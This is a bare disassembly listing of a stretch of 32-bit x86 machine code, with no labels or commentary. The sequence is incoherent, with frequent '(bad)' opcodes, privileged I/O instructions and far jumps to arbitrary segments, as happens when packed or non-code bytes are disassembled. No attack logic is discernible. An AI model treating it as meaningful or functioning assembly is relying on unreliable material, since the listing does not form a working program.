  41097b:	xchg   esi,eax
  41097c:	mov    ah,ah
  41097e:	cmp    DWORD PTR [esi],0xde2caa5b
  410984:	mov    edx,0xbcb4dd98
  410989:	sub    al,0x2
  41098b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41098c:	fsub   QWORD PTR ds:0x718f1c10
  410992:	jne    0x4109eb
  410994:	dec    ebx
  410995:	cmp    al,BYTE PTR [ebp+0x275bb9aa]
  41099b:	jg     0x4109d9
  41099d:	push   0xffffffe9
  41099f:	push   eax
  4109a0:	mov    BYTE PTR [si-0x5292],al
  4109a5:	in     eax,dx
  4109a6:	or     BYTE PTR [esp+ebp*2+0x23aff60f],ah
  4109ad:	out    dx,al
  4109ae:	xlat   BYTE PTR ds:[ebx]
  4109af:	mov    ecx,0x7b26e72d
  4109b4:	retf   
  4109b5:	je     0x4109fe
  4109b7:	push   edi
  4109b8:	sub    ah,dl
  4109ba:	cmp    eax,esp
  4109bc:	mov    dh,0x97
  4109be:	daa    
  4109bf:	ror    BYTE PTR fs:[eax],0x20
  4109c3:	aam    0xf
  4109c5:	sub    BYTE PTR [ecx-0x7ffd5af1],0x5
  4109cc:	push   esi
  4109cd:	dec    eax
  4109ce:	stos   DWORD PTR es:[edi],eax
  4109cf:	mov    ds:0x722eee1a,eax
  4109d4:	ins    BYTE PTR es:[edi],dx
  4109d5:	mov    ah,bh
  4109d7:	test   eax,0xa8b5321a
  4109dc:	(bad)  
  4109dd:	retf   0xad67
  4109e0:	inc    ebp
  4109e1:	cmp    al,0xba
  4109e3:	jge    0x4109f1
  4109e5:	and    eax,0xf2263506
  4109ea:	and    DWORD PTR [edx+0x72],edi
  4109ed:	jnp    0x410a2a
  4109ef:	and    dl,cl
  4109f1:	sub    DWORD PTR [esi-0x6d],ebx
  4109f4:	sbb    BYTE PTR ds:0xfff7e41b,bh
  4109fa:	xchg   esi,eax
  4109fb:	push   eax
  4109fc:	mov    eax,0xe432d192
  410a01:	adc    esi,edx
  410a03:	push   eax
  410a04:	dec    edi
  410a05:	pop    ebx
  410a06:	mov    eax,0x554608e6
  410a0b:	jo     0x4109fe
  410a0d:	xchg   ebp,eax
  410a0e:	and    BYTE PTR [ecx-0x71],bh
  410a11:	pop    es
  410a12:	dec    edx
  410a13:	int    0x3e
  410a15:	jbe    0x410a4a
  410a17:	lods   eax,DWORD PTR ds:[esi]
  410a18:	jno    0x4109ee
  410a1a:	mov    ds:0x6b0cdd3f,eax
  410a1f:	neg    DWORD PTR [ecx-0x62]
  410a22:	xlat   BYTE PTR ds:[ebx]
  410a23:	mov    edi,0x1895294b
  410a28:	and    ebx,0xf8f5841a
  410a2e:	hlt    
  410a2f:	outs   dx,BYTE PTR ds:[esi]
  410a30:	les    edx,FWORD PTR [eax+esi*4+0x4e]
  410a34:	inc    eax
  410a35:	pop    eax
  410a36:	and    al,0x1a
  410a38:	wbinvd 
  410a3a:	dec    esi
  410a3b:	mov    cl,0xdb
  410a3d:	mov    ax,ds:0x5e924237
  410a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a44:	pop    edi
  410a45:	cmp    al,0xde
  410a47:	cmp    BYTE PTR gs:[ecx],al
  410a4a:	call   0x5cc4:0xb3414bb0
  410a51:	shr    DWORD PTR [eax-0x7a],cl
  410a54:	arpl   WORD PTR [esi+eax*2-0x45],si
  410a58:	push   esi
  410a59:	loop   0x4109e3
  410a5b:	sbb    bl,dh
  410a5d:	(bad)
  410a62:	jns    0x410ac0
  410a64:	and    eax,0xc0836e7c
  410a69:	mov    ah,0xa5
  410a6b:	inc    edx
  410a6c:	(bad)  
  410a6e:	in     eax,dx
  410a6f:	dec    ecx
  410a70:	adc    ebp,edx
  410a72:	repz jge 0x410abf
  410a75:	xchg   BYTE PTR [edi-0x16aea72e],ch
  410a7b:	int    0x8a
  410a7d:	rol    cl,0x1e
  410a80:	sbb    BYTE PTR ds:0x731a64bc,ch
  410a86:	mov    ds:0xa1cdbe3e,ax
  410a8c:	imul   DWORD PTR [edi]
  410a8e:	add    esi,edx
  410a90:	mov    WORD PTR [eax],?
  410a92:	dec    esi
  410a93:	loop   0x410acb
  410a95:	test   esp,edx
  410a97:	sub    DWORD PTR [ebx-0x7e910cad],ecx
  410a9d:	cmp    eax,0xc0c29cde
  410aa2:	jbe    0x410ac5
  410aa4:	dec    ebx
  410aa5:	xchg   DWORD PTR [esi-0x65],edi
  410aa8:	sub    eax,0xfe68132e
  410aad:	rcr    cl,1
  410aaf:	mov    ch,0xc4
  410ab1:	data16 arpl WORD PTR [edi],dx
  410ab4:	mov    es,WORD PTR [esi+0x40]
  410ab7:	fucomip st,st(4)
  410ab9:	mov    ds:0x5f1e0809,al
  410abe:	je     0x410b28
  410ac0:	mov    cl,0x5e
  410ac2:	inc    ebx
  410ac3:	and    eax,0x3888a781
  410ac8:	and    eax,0x3050f6aa
  410acd:	push   esp
  410ace:	int3   
  410acf:	test   DWORD PTR [ecx],esi
  410ad1:	sub    BYTE PTR [eax+0x5e],ch
  410ad4:	sub    ebp,DWORD PTR [ecx]
  410ad6:	not    DWORD PTR [ebx]
  410ad8:	ins    DWORD PTR es:[edi],dx
  410ad9:	jb     0x410a6f
  410adb:	ret    0x8f06
  410ade:	(bad)  
  410ae0:	lods   al,BYTE PTR ds:[esi]
  410ae1:	inc    ebp
  410ae2:	(bad)  
  410ae3:	mov    al,0x5a
  410ae5:	mov    eax,esi
  410ae7:	pop    edi
  410ae8:	jp     0x410abc
  410aea:	cmp    cl,BYTE PTR ss:[edi+0x41]
  410aee:	inc    eax
  410aef:	jne    0x410b09
  410af1:	sub    al,0x2d
  410af3:	push   edi
  410af4:	fld    QWORD PTR [ebx+0x627ef1fb]
  410afa:	test   al,0xe2
  410afc:	hlt    
  410afd:	or     al,0xb0
  410aff:	aaa    
  410b00:	dec    ebx
  410b01:	pop    es
  410b02:	jae    0x410b19
  410b04:	ret    
  410b05:	xor    BYTE PTR ds:0x219bdaa4,0xad
  410b0c:	mov    eax,0x808c324
  410b11:	and    BYTE PTR [ecx-0x35649524],0x6b
  410b18:	xchg   ebp,eax
  410b19:	mov    eax,0xec31df05
  410b1e:	es jbe 0x410b3e
  410b21:	ja     0x410b08
  410b23:	xor    ah,BYTE PTR [ebx-0x3c]
  410b26:	sbb    DWORD PTR [ebx+0x7a],esp
  410b29:	in     al,dx
  410b2a:	jl     0x410b40
  410b2c:	push   es
  410b2d:	test   al,0x37
  410b2f:	cmp    cl,BYTE PTR [eax+ebp*2]
  410b32:	div    DWORD PTR [ecx-0x12]
  410b35:	xchg   ebx,eax
  410b36:	push   cs
  410b37:	xor    al,0x6e
  410b39:	pushf  
  410b3a:	push   ebx
  410b3b:	xor    eax,0x149bcc52
  410b40:	cmp    eax,DWORD PTR [eax*4+0x716dc00d]
  410b47:	fs dec esp
  410b49:	pop    edi
  410b4a:	xchg   ecx,eax
  410b4b:	push   esi
  410b4c:	fadd   QWORD PTR [ecx+0x4dd86b6f]
  410b52:	jno    0x410b8b
  410b54:	jp     0x410b71
  410b56:	jno    0x410b3c
  410b58:	mov    DWORD PTR [eax],ecx
  410b5a:	iret   
  410b5b:	nop
  410b5c:	pop    ecx
  410b5d:	dec    ebp
  410b5e:	out    dx,al
  410b5f:	out    0x94,eax
  410b61:	ss rcl ebx,0xf3
  410b65:	inc    eax
  410b66:	mov    dl,0x5c
  410b68:	ret    
  410b69:	and    BYTE PTR [esi-0x42],bl
  410b6c:	or     eax,0x13764c7b
  410b71:	push   esi
  410b72:	xchg   esp,eax
  410b73:	mov    bl,0x71
  410b75:	adc    BYTE PTR [ecx+0x48],dh
  410b78:	lods   eax,DWORD PTR ds:[esi]
  410b79:	pop    ebp
  410b7b:	xlat   BYTE PTR ds:[ebx]
  410b7c:	jo     0x410b03
  410b7e:	icebp  
  410b7f:	and    BYTE PTR [esp+eax*8],0x97
  410b83:	mov    esi,DWORD PTR [edi-0x5b8c0837]
  410b89:	(bad)  
  410b8a:	test   al,0xe9
  410b8c:	mov    ebx,0x143c8cf2
  410b91:	jmp    0x5a0b:0x1ba7bc49
  410b98:	into   
  410b99:	mul    eax
  410b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b9c:	mov    dl,0x73
  410b9e:	push   esp
  410b9f:	retf   
  410ba0:	int    0x97
  410ba2:	xor    cl,0xd0
  410ba5:	dec    ebx
  410ba6:	in     eax,dx
  410ba7:	mov    eax,ds:0xa8a8ee11
  410bac:	jnp    0x410bed
  410bae:	dec    edi
  410baf:	mov    DWORD PTR [esi],esi
  410bb1:	idiv   BYTE PTR [edx]
  410bb3:	mov    bl,0xff
  410bb5:	pop    edx
  410bb6:	xlat   BYTE PTR ds:[ebx]
  410bb7:	pop    eax
  410bb8:	test   DWORD PTR [esi+0x24a581ca],edx
  410bbe:	push   0x5d
  410bc0:	not    DWORD PTR cs:[ecx]
  410bc3:	pop    es
  410bc4:	pop    ebp
  410bc5:	xchg   dl,ah
  410bc7:	in     al,dx
  410bc8:	pop    ebx
  410bc9:	loop   0x410bd9
  410bcb:	jbe    0x410c00
  410bcd:	pushf  
  410bce:	stc    
  410bcf:	dec    ebp
  410bd0:	into   
  410bd1:	adc    BYTE PTR [ecx+edi*2-0x1a],bl
  410bd5:	or     esi,ecx
  410bd7:	adc    BYTE PTR [esi+0x70],0xeb
  410bdb:	adc    al,0x73
  410bdd:	inc    edi
  410bde:	nop
  410bdf:	push   eax
  410be0:	fisttp WORD PTR [esp+ebp*4-0x1a]
  410be4:	call   0xa56e:0x24288543
  410beb:	jp     0x410bd7
  410bed:	jmp    DWORD PTR [eax+0x48]
  410bf0:	cli    
  410bf1:	mov    esi,0xff039a47
  410bf6:	add    edx,DWORD PTR [eax]
  410bf8:	iret   
  410bf9:	in     eax,dx
  410bfa:	in     eax,0x40
  410bfc:	fmul   st,st(5)
  410bfe:	aaa    
  410bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c00:	int3   
  410c01:	mov    eax,0x4db3d4b
  410c06:	jmp    0x410bf0
  410c08:	scas   eax,DWORD PTR es:[edi]
  410c09:	cmp    BYTE PTR [edi+0x1b],al
  410c0c:	arpl   WORD PTR [eax],sp
  410c0e:	adc    eax,0x19f7c772
  410c13:	test   eax,0x16798608
  410c18:	ret    
  410c19:	xchg   BYTE PTR [esi],bh
  410c1b:	xchg   edx,eax
  410c1c:	iret   
  410c1d:	fld    st(4)
  410c1f:	push   ebx
  410c20:	test   BYTE PTR [edx+0x74],al
  410c23:	cdq    
  410c24:	arpl   WORD PTR [edi-0x1e968111],di
  410c2a:	adc    eax,0x39e2d05a
  410c2f:	xchg   ebp,eax
  410c30:	dec    ebp
  410c31:	in     eax,0x1f
  410c33:	dec    edi
  410c34:	xlat   BYTE PTR ds:[ebx]
  410c35:	dec    eax
  410c36:	lea    ecx,[edi-0x28960cab]
  410c3c:	sbb    esi,0x4f
  410c3f:	dec    edi
  410c40:	fmul   QWORD PTR [esi-0x8]
  410c43:	dec    ebx
  410c44:	mov    edx,0xc1afff62
  410c49:	dec    esp
  410c4a:	ds sub eax,0xa8b586b2
  410c50:	ficomp WORD PTR [eax]
  410c52:	and    al,0xb1
  410c54:	in     eax,0xec
  410c56:	and    DWORD PTR [edi],edi
  410c58:	jp     0x410c46
  410c5a:	adc    eax,0xe33ab910
  410c5f:	and    al,0x29
  410c61:	pop    edi
  410c62:	cld    
  410c63:	or     eax,0xcb674fa1
  410c68:	std    
  410c69:	mov    bh,0xde
  410c6b:	bound  esi,QWORD PTR [ecx-0x19]
  410c6e:	inc    ebp
  410c6f:	push   cs
  410c70:	and    esp,edi
  410c72:	mov    ecx,0xe3ee8cbd
  410c77:	xlat   BYTE PTR ds:[ebx]
  410c78:	sub    esi,DWORD PTR [ecx-0x73c4eb98]
  410c7e:	dec    edx
  410c7f:	dec    ecx
  410c80:	sub    eax,0x7cb6d335
  410c85:	loopne 0x410cc9
  410c87:	jecxz  0x410c8d
  410c89:	dec    esi
  410c8a:	(bad)  
  410c8b:	daa    
  410c8c:	dec    ebp
  410c8d:	xor    al,0x9c
  410c8f:	sub    eax,0x95750ef6
  410c94:	xchg   esi,eax
  410c95:	inc    ecx
  410c96:	mov    ebp,0x7458ff3b
  410c9b:	pop    es
  410c9c:	sbb    dh,BYTE PTR [ecx]
  410c9e:	push   edi
  410c9f:	sub    BYTE PTR [ebx],bh
  410ca1:	and    DWORD PTR [edi-0x5],edx
  410ca4:	mov    DWORD PTR [edi+0x577db587],0x10c6fdf5
  410cae:	repz adc al,dl
  410cb1:	and    BYTE PTR [edi+ebx*4-0x219d27a2],ch
  410cb8:	scas   al,BYTE PTR es:[edi]
  410cb9:	in     al,dx
  410cba:	add    ebx,eax
  410cbc:	loopne 0x410c89
  410cbe:	stc    
  410cbf:	rcr    dl,1
  410cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cc2:	add    esi,DWORD PTR [edx]
  410cc4:	and    al,0xfb
  410cc6:	cwde   
  410cc7:	shr    DWORD PTR [edi+ecx*1],1
  410cca:	push   ds
  410ccb:	mov    ebp,0xc855e3a6
  410cd0:	jb     0x410cd7
  410cd2:	sbb    edi,DWORD PTR [ecx-0x6f1b4808]
  410cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cd9:	lock mov edi,0xe55c5ec
  410cdf:	cmp    ebx,DWORD PTR [edi+0x0]
  410ce2:	xchg   BYTE PTR [edx],bl
  410ce4:	or     DWORD PTR [ebp+0x8],esi
  410ce7:	sbb    DWORD PTR [edi-0x21],ebp
  410cea:	add    eax,0x5fc32021
  410cef:	das    
  410cf0:	(bad)  
  410cf2:	sbb    DWORD PTR [esi],eax
  410cf4:	imul   ebp,edi,0x5e8a9967
  410cfa:	gs out dx,eax
  410cfc:	jmp    0x25fa:0xa8a3b258
  410d03:	xchg   ecx,eax
  410d04:	add    bh,BYTE PTR [esi+0x50d11b39]
  410d0a:	test   DWORD PTR [edx+ecx*1+0x3b],ebx
  410d0e:	push   eax
  410d0f:	pusha  
  410d10:	jno    0x410d72
  410d12:	aam    0x5f
  410d14:	mov    ebx,0x5cfcf757
  410d19:	loopne 0x410cdd
  410d1b:	rol    BYTE PTR [edi+0x7a],0xd9
  410d1f:	xor    eax,DWORD PTR [edx+0x4ba7321a]
  410d25:	mov    ebx,0x743db7d3
  410d2a:	jmp    0xbf91:0xc840c55e
  410d31:	or     al,0xe4
  410d33:	mov    ch,0x60
  410d35:	and    eax,0xf3a8067b
  410d3a:	xchg   ebx,eax
  410d3b:	add    cl,bh
  410d3d:	or     DWORD PTR [eax+0x75],eax
  410d40:	sar    BYTE PTR [ecx+0x7b9f71ac],0xb
  410d47:	pop    eax
  410d48:	pop    es
  410d49:	pop    ecx
  410d4a:	sbb    al,0x4e
  410d4c:	sub    eax,0x1b99c945
  410d51:	dec    ecx
  410d52:	shl    ebx,cl
  410d54:	mov    ebp,DWORD PTR [esi]
  410d56:	loop   0x410d50
  410d58:	mov    ch,0xc4
  410d5a:	or     eax,DWORD PTR [eax+0x71]
  410d5d:	call   FWORD PTR [esi+0x4c245868]
  410d63:	xlat   BYTE PTR ds:[ebx]
  410d64:	add    al,0xdf
  410d66:	cwde   
  410d67:	jo     0x410d9d
  410d69:	loopne 0x410d4b
  410d6b:	das    
  410d6c:	loope  0x410d48
  410d6e:	sbb    eax,0xc155b1d6
  410d73:	mov    cl,0xac
  410d75:	ja     0x410dc7
  410d77:	jne    0x410d40
  410d79:	repz pop ecx
  410d7b:	mov    ah,0x39
  410d7d:	push   ecx
  410d7e:	clc    
  410d7f:	pop    es
  410d80:	inc    esp
  410d81:	(bad)  
  410d82:	mov    bh,0xf
  410d84:	das    
  410d85:	test   DWORD PTR [eax-0x45],0xf267787a
  410d8c:	and    dh,ch
  410d8e:	sub    al,0xa
  410d90:	ins    BYTE PTR es:[edi],dx
  410d91:	inc    ebx
  410d92:	retf   
  410d93:	out    dx,eax
  410d94:	add    al,0x2b
  410d96:	mov    bh,0x1d
  410d98:	mov    esp,0xe8adb8cf
  410d9d:	push   ds
  410d9e:	daa    
  410d9f:	fstp   DWORD PTR [ecx]
  410da1:	lods   eax,DWORD PTR ds:[esi]
  410da2:	inc    esi
  410da3:	aam    0x5a
  410da5:	and    DWORD PTR [edx-0xb],esi
  410da8:	xchg   ebx,eax
  410da9:	and    cl,dl
  410dab:	dec    esi
  410dac:	fadd   DWORD PTR [edi+eiz*8+0x6e]
  410db0:	loopne 0x410d89
  410db2:	mov    ss,WORD PTR [ebp-0x1aa150a1]
  410db8:	sub    DWORD PTR [edx+0x7b89596c],0xffffffae
  410dbf:	daa    
  410dc0:	pushf  
  410dc1:	pushf  
  410dc2:	aas    
  410dc3:	int3   
  410dc4:	fdiv   st(4),st
  410dc6:	dec    ebp
  410dc7:	and    al,BYTE PTR [ebp-0x23]
  410dca:	fwait
  410dcb:	in     eax,dx
  410dcc:	pop    ebp
  410dcd:	in     al,dx
  410dce:	push   edi
  410dcf:	and    BYTE PTR [ecx+esi*1],dh
  410dd2:	(bad)  
  410dd3:	(bad)  
  410dd4:	push   0xbe1ce3b1
  410dd9:	or     ebx,DWORD PTR [ebx+0x67088c4e]
  410ddf:	cmp    esp,DWORD PTR [edi+0x62]
  410de2:	mov    edi,0x32c61352
  410de7:	xchg   BYTE PTR [ecx],dh
  410de9:	ret    
  410dea:	iret   
  410deb:	pop    ss
  410dec:	mov    ebx,0x7b5934b9
  410df1:	repz (bad) 
  410df3:	sbb    DWORD PTR [edi+eiz*8+0x6bc4d998],esp
  410dfa:	out    dx,eax
  410dfb:	mov    ch,0x72
  410dfd:	xchg   DWORD PTR [bx+di-0x42],edi
  410e01:	push   cs
  410e02:	add    ax,0x9f3a
  410e06:	sbb    ah,BYTE PTR [ebx+0x2a]
  410e09:	sbb    ecx,esi
  410e0b:	sub    ah,BYTE PTR [edx+ecx*8-0x14ddd7fb]
  410e12:	popf   
  410e13:	ret    
  410e14:	xor    al,0xf7
  410e16:	gs pop ecx
  410e18:	sbb    ebx,DWORD PTR [edi-0x7404b9e0]
  410e1e:	or     BYTE PTR [esi+0x3cbd4961],bl
  410e24:	not    BYTE PTR [ebx-0xdd379f6]
  410e2a:	inc    ebx
  410e2b:	mov    esp,0x99938f49
  410e30:	(bad)  
  410e31:	fldenv [ebp+eiz*1+0x6b8e5245]
  410e38:	icebp  
  410e39:	int    0x30
  410e3b:	cmp    eax,0x7601035d
  410e40:	and    bh,dh
  410e42:	inc    eax
  410e43:	sub    DWORD PTR [edi+edi*4-0x7e766bf],0x3b
  410e4b:	mov    ecx,DWORD PTR [edx+0x1d3645d5]
  410e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e52:	mov    eax,0x8414a1c7
  410e57:	or     DWORD PTR [ecx-0x67],edx
  410e5a:	out    dx,al
  410e5b:	cwde   
  410e5c:	in     al,0x38
  410e5e:	test   al,0xab
  410e60:	iret   
  410e61:	adc    esp,DWORD PTR [ebp+0x48]
  410e64:	enter  0xfe7f,0x48
  410e68:	push   esi
  410e69:	mov    ch,0x48
  410e6b:	push   es
  410e6c:	rcl    DWORD PTR [edi],1
  410e6e:	cmp    al,0xf
  410e70:	jno    0x410e61
  410e72:	xor    al,0xd3
  410e74:	cli    
  410e75:	js     0x410e69
  410e77:	cmc    
  410e78:	sub    DWORD PTR [ebp+0x24],0x81df30e5
  410e7f:	div    DWORD PTR [eiz*2+0x42eec6fc]
  410e86:	aaa    
  410e87:	dec    ecx
  410e88:	lds    esp,FWORD PTR [edi-0x4f59637d]
  410e8e:	inc    esi
  410e8f:	hlt    
  410e90:	push   esp
  410e91:	outs   dx,BYTE PTR ds:[esi]
  410e92:	aas    
  410e93:	mov    ds:0x9b745eaa,eax
  410e98:	mov    bl,0x4b
  410e9a:	dec    esi
  410e9b:	sbb    BYTE PTR [edi+0x18],dl
  410e9e:	shl    BYTE PTR [edx+0x22e6ed74],cl
  410ea4:	xchg   edx,eax
  410ea5:	push   es
  410ea6:	clc    
  410ea7:	(bad)  
  410ea8:	mov    esp,0xf3bf66bc
  410ead:	cmp    al,cl
  410eaf:	aaa    
  410eb0:	stc    
  410eb1:	pop    ecx
  410eb2:	cmp    ah,0x23
  410eb5:	and    DWORD PTR [ecx-0x25ec5501],edi
  410ebb:	data16 cmc 
  410ebd:	xchg   BYTE PTR [ecx+0x11],dh
  410ec0:	xor    al,0x1e
  410ec2:	sbb    edi,DWORD PTR [ebx+0x71899ef9]
  410ec8:	push   esi
  410ec9:	fldenv [esi-0x5fe2a3c6]
  410ecf:	push   ss
  410ed0:	icebp  
  410ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed2:	inc    esp
  410ed3:	push   esi
  410ed4:	fmul   QWORD PTR [ebx]
  410ed6:	das    
  410ed7:	mov    cs,WORD PTR [eax]
  410ed9:	push   ecx
  410eda:	(bad)  
  410edb:	rol    DWORD PTR [ebp-0xcfef023],0x6d
  410ee2:	shl    edx,cl
  410ee4:	and    al,0xb3
  410ee6:	inc    esi
  410ee7:	pop    eax
  410ee8:	in     al,0x72
  410eea:	clc    
  410eeb:	pop    esp
  410eec:	mov    esp,DWORD PTR [esi+0x28]
  410eef:	rcr    DWORD PTR [esi+ebx*1-0x68],0x4c
  410ef4:	sbb    al,BYTE PTR [esi-0xc12e85d]
  410efa:	mov    cl,0xb0
  410efc:	pop    eax
  410efd:	add    ebx,edi
  410eff:	cld    
  410f00:	sti    
  410f01:	test   DWORD PTR [esi+0x3e],edx
  410f04:	outs   dx,DWORD PTR ds:[esi]
  410f05:	adc    BYTE PTR [esi-0x7],0x30
  410f09:	xor    BYTE PTR [edx+0x5f],bh
  410f0c:	pop    ecx
  410f0d:	outs   dx,DWORD PTR ds:[esi]
  410f0e:	aaa    
  410f0f:	push   ecx
  410f10:	shl    BYTE PTR [edi+0x7d],0xe5
  410f14:	aam    0x5c
  410f16:	jbe    0x410ece
  410f18:	mov    ch,0x49
  410f1a:	(bad)  
  410f1b:	in     al,dx
  410f1c:	das    
  410f1d:	dec    ebp
  410f1e:	jb     0x410f4e
  410f20:	mov    ebx,0x4dba29b4
  410f25:	pop    ebp
  410f26:	clc    
  410f27:	dec    esp
  410f28:	jno    0x410f57
  410f2a:	mov    ecx,0x9616354c
  410f2f:	ins    DWORD PTR es:[edi],dx
  410f30:	call   0x6318:0xccbaf15f
  410f37:	jecxz  0x410fb7
  410f39:	mov    eax,0xe93de4ae
  410f3e:	xchg   edx,eax
  410f3f:	cmp    DWORD PTR [edx],ebx
  410f41:	jmp    0x410ece
  410f43:	retf   0xa3cf
  410f46:	sbb    esp,ebp
  410f48:	jp     0x410f7d
  410f4a:	mov    ds:0x60477f90,eax
  410f4f:	or     DWORD PTR [edx],edx
  410f51:	(bad)  
  410f52:	adc    al,0x4f
  410f54:	call   0x6e2610f2
  410f59:	shr    DWORD PTR [esi],1
  410f5b:	dec    esp
  410f5c:	pop    edi
  410f5d:	mov    edi,0xaa0518f7
  410f62:	and    edi,DWORD PTR [ebx]
  410f64:	jne    0x410ee8
  410f66:	inc    esi
  410f67:	cmp    ebp,DWORD PTR [ebp+ebp*8+0xc]
  410f6b:	stc    
  410f6c:	cmp    dh,bl
  410f6e:	push   ebx
  410f6f:	xchg   edx,eax
  410f71:	repz test BYTE PTR [eax+0x4b23f6aa],al
  410f78:	int    0xce
  410f7a:	ret    
  410f7b:	mov    ah,0x25
  410f7d:	shr    DWORD PTR [edx],cl
  410f7f:	dec    esi
  410f80:	sbb    edi,ebp
  410f82:	out    0x53,eax
  410f84:	mov    edx,0x4a55c73d
  410f89:	neg    DWORD PTR [esp+esi*4]
  410f8c:	aam    0xd0
  410f8e:	(bad)  
  410f8f:	dec    eax
  410f90:	pop    es
  410f91:	ss mov esi,0x517e9436
  410f97:	(bad)  
  410f98:	ret    
  410f99:	loop   0x410f8c
  410f9b:	leave  
  410f9c:	mov    ch,0x55
  410f9e:	in     al,dx
  410f9f:	(bad)
  410fa3:	test   eax,0xd6a080c4
  410fa8:	add    BYTE PTR [esi],bh
  410faa:	pop    esi
  410fab:	scas   eax,DWORD PTR es:[edi]
  410fac:	xor    dl,cl
  410fae:	imul   edx,DWORD PTR [edx],0x98c138ad
  410fb4:	fistp  QWORD PTR ds:0x99b2faf
  410fba:	aaa    
  410fbb:	mov    edi,0xc98c4959
  410fc0:	nop
  410fc1:	cmp    edx,DWORD PTR [ecx+0x67e02c87]
  410fc7:	xor    eax,0x2e54bd52
  410fcc:	and    ecx,ecx
  410fce:	xlat   BYTE PTR ds:[ebx]
  410fcf:	mov    dl,0x96
  410fd1:	mov    WORD PTR [ebx],fs
  410fd3:	neg    BYTE PTR [edi-0x60]
  410fd6:	xchg   BYTE PTR [ecx+0x23],bh
  410fd9:	mov    cl,0x0
  410fdb:	sbb    eax,0x19416315
  410fe0:	pop    esp
  410fe1:	inc    ebx
  410fe2:	nop
  410fe3:	xchg   ecx,eax
  410fe4:	loop   0x411004
  410fe6:	lock cmp BYTE PTR [ebx+edi*1],bl
  410fea:	push   edi
  410feb:	nop
  410fec:	push   edx
  410fed:	stc    
  410fee:	mov    dl,0x48
  410ff0:	jo     0x41105c
  410ff2:	jmp    0x410fd7
  410ff4:	enter  0x659d,0x26
  410ff8:	test   eax,0x66f4f51
  410ffd:	jno    0x41101b
  410fff:	jmp    0xbff:0xc40f29f2
  411006:	std    
  411007:	dec    esi
  411008:	add    ah,bl
  41100a:	scas   eax,DWORD PTR es:[edi]
  41100b:	shl    BYTE PTR [edx-0x48],cl
  41100e:	arpl   WORD PTR [ebp-0x7f],dx
  411011:	dec    ecx
  411012:	call   0x13a6:0x670a0169
  411019:	xor    BYTE PTR [ebx+0x361b39a1],0x1d
  411020:	pop    esp
  411021:	dec    ecx
  411022:	into   
  411023:	push   ebp
  411024:	cmc    
  411025:	sbb    eax,0xabbc360a
  41102a:	addr16 ss cdq 
  41102d:	aas    
  41102e:	push   cs
  41102f:	mov    ebx,esi
  411031:	imul   esi,DWORD PTR [ecx+ecx*8+0x4b],0xa633b4c6
  411039:	inc    ebp
  41103a:	add    edi,DWORD PTR ss:0x35eaa799
  411041:	adc    DWORD PTR [edx+0xe],ecx
  411044:	lahf   
  411045:	lock sbb al,0x97
  411048:	loope  0x41103c
  41104a:	enter  0x4bb2,0x44
  41104e:	sbb    al,BYTE PTR [edi-0x9b6028a]
  411054:	mov    eax,0xe6b6cc45
  411059:	ins    DWORD PTR es:[edi],dx
  41105a:	or     BYTE PTR [edi-0x4dcea5ae],dl
  411060:	fisubr WORD PTR [ecx+0x7a]
  411063:	jecxz  0x41104c
  411065:	inc    edi
  411066:	repnz push ebp
  411068:	mov    BYTE PTR [edx-0x7],0x4e
  41106c:	mov    edx,0xa0aaf78a
  411071:	nop
  411072:	neg    DWORD PTR [edi-0x43]
  411075:	jecxz  0x411064
  411077:	adc    DWORD PTR [esi+0x55],ebx
  41107a:	mov    ecx,0x61c9cf5d
  41107f:	dec    esp
  411080:	sub    ecx,edx
  411082:	pusha  
  411083:	fwait
  411084:	pushf  
  411085:	jbe    0x4110f8
  411087:	mov    al,dh
  411089:	(bad)  [edi]
  41108b:	inc    edx
  41108c:	cmc    
  41108d:	jno    0x411097
  41108f:	(bad)  
  411090:	daa    
  411091:	sub    al,0x8
  411093:	test   esi,eax
  411095:	jmp    0x6566ccc9
  41109a:	mov    esp,0xd63c28ed
  41109f:	fld    TBYTE PTR [edi+0xc]
  4110a2:	or     eax,0xeae60cc2
  4110a7:	sub    esi,DWORD PTR [ebx-0x359f4926]
  4110ad:	out    dx,eax
  4110ae:	bound  ebp,QWORD PTR [eax]
  4110b0:	or     ebx,DWORD PTR [ebx]
  4110b2:	dec    ebp
  4110b3:	jl     0x4110e6
  4110b5:	xor    bh,dh
  4110b7:	adc    al,0x2b
  4110b9:	pop    esi
  4110ba:	pop    eax
  4110bb:	ins    BYTE PTR es:[edi],dx
  4110bc:	out    0x96,eax
  4110be:	pop    edx
  4110bf:	outs   dx,DWORD PTR ds:[esi]
  4110c0:	pop    edi
  4110c1:	out    dx,eax
  4110c2:	inc    edx
  4110c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c4:	div    BYTE PTR [ebx]
  4110c6:	loopne 0x4110f5
  4110c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110c9:	outs   dx,BYTE PTR ds:[esi]
  4110ca:	test   DWORD PTR [edx-0x1cfc3d5f],ebp
  4110d0:	dec    edi
  4110d1:	ss add eax,0xa22edbbf
  4110d7:	inc    ebp
  4110d8:	add    DWORD PTR [ebx+0x7e],ebx
  4110db:	cwde   
  4110dc:	in     al,dx
  4110dd:	loope  0x4110e7
  4110df:	or     al,BYTE PTR [edx+0x1421ff33]
  4110e5:	leave  
  4110e6:	or     DWORD PTR [ebp-0x5a],ecx
  4110e9:	and    cl,BYTE PTR [edi]
  4110eb:	dec    eax
  4110ec:	in     al,dx
  4110ed:	jp     0x411160
  4110ef:	xchg   edx,eax
  4110f0:	shr    DWORD PTR [eax],cl
  4110f2:	mov    ds:0x63c3e695,eax
  4110f7:	jg     0x4110e4
  4110f9:	(bad)  
  4110fa:	push   ss
  4110fb:	mov    cl,0x51
  4110fd:	jmp    0x8ccf2daa
  411102:	or     al,0xa4
  411104:	push   esp
  411105:	adc    DWORD PTR [edx-0x5b],ecx
  411108:	(bad)  
  411109:	jmp    0x8a88:0x3d738306
  411110:	adc    BYTE PTR ds:0x57d33644,ah
  411116:	sahf   
  411117:	add    al,0xff
  411119:	aaa    
  41111a:	or     BYTE PTR [edx],dh
  41111c:	or     ecx,ecx
  41111e:	push   esp
  41111f:	pop    es
